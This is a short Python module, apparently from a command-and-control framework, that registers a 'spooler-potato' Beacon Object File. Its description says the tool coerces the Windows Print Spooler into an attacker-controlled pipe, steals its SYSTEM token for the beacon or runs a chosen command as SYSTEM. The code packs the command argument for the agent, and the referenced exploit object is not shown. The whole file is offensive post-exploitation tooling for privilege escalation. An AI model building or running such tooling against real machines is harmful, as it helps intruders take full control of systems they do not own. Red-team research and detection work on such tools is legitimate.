import struct

BOF_NAME    = "spooler-potato"
BOF_FILE    = "spooler_potato_bof.o"
COMMAND     = "spooler-potato"
DESCRIPTION = (
    "Spooler Potato  coerce Print Spooler (SYSTEM) into our pipe and steal its token. "
    "No args: apply SYSTEM token to the beacon (use 'rev2self' to revert). "
    "With args: run the given command as SYSTEM. "
    "Requires SeImpersonatePrivilege."
)


def run(agent_id, args):
    cmd = (args or "").strip()

    if not cmd or cmd.lower() in ("t", "token"):
        return b""

    cmd_bytes = cmd.encode("utf-8") + b"\x00"
    return struct.pack("<I", len(cmd_bytes)) + cmd_bytes
